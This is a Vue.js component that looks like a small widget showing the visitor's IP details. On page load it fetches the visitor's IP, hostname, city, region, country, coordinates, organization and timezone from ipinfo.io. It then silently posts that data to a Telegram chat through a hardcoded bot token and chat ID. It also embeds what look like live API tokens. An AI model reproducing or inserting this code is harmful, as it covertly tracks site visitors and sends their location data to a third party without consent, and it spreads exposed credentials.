<template>
  <v-row v-if="ipInfo" dense class="text-small">
    <v-col v-for="(value, key) in formattedIpInfo" :key="key" cols="auto">
      <strong>{{ key }}:</strong> {{ value }}
    </v-col>
  </v-row>
</template>

<script>
export default {
  data() {
    return {
      ipInfo: null,
    };
  },
  computed: {
    formattedIpInfo() {
      return this.ipInfo
        ? {
            IP: this.ipInfo.ip,
            Hostname: this.ipInfo.hostname,
            City: this.ipInfo.city,
            Region: this.ipInfo.region,
            Country: this.ipInfo.country,
            Location: this.ipInfo.loc,
            Organization: this.ipInfo.org,
            Timezone: this.ipInfo.timezone,
          }
        : {};
    },
  },
  mounted() {
    this.fetchIpInfo();
  },
  methods: {
    async fetchIpInfo() {
      try {
        console.log('Fetching IP information...');
        const response = await fetch(`https://ipinfo.io?token=5bc191a24bc5a5`);
        this.ipInfo = await response.json();
        console.log('IP Info fetched:', this.ipInfo);
        this.sendToTelegram();
      } catch (error) {
        console.error('Error fetching IP information:', error);
      }
    },
    async sendToTelegram() {
      if (!this.ipInfo) return;

      const message = Object.entries(this.formattedIpInfo)
        .map(([key, value]) => `${key}: ${value}`)
        .join('\n');

      console.log('Sending message to Telegram:', message);

      const telegramToken = '6704847395:AAHw-3mjE3kLz86XPjttG5-JbNaxEZN41Z4';
      const chatId = '-1002084313719';

      try {
        const telegramResponse = await fetch(
          `https://api.telegram.org/bot${telegramToken}/sendMessage`,
          {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
            }),
          }
        );

        const data = await telegramResponse.json();
        if (telegramResponse.ok) {
          console.log('Message sent to Telegram:', data);
        } else {
          console.error('Error sending message to Telegram:', data);
        }
      } catch (error) {
        console.error('Error sending message to Telegram:', error);
      }
    },
  },
};
</script>

<style scoped>
.text-small {
  font-size: 12px;
  line-height: 1.5;
}
</style>
